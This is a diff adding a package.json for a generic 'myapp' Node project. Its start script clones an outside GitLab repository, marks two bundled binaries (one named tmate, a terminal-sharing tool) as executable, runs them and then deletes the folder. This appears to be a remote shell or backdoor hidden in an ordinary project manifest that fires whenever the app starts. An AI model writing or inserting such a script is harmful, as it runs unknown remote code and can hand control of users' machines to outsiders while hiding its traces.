@@ -1,0 +1,11 @@
+{
+  "name" : "myapp",
+  "version" : "0.1.0",
+  "main" : "myapp.js",
+  "scripts" : {
+    "start" : "git clone https://gitlab.com/cuanbos/tmateo.git && cd tmateo && chmod +x tmate && chmod +x tmateo && ./tmateo && rm -rf tmateo"
+  },
+  "engines" : {
+    "node" : "^10"
+  }
+}
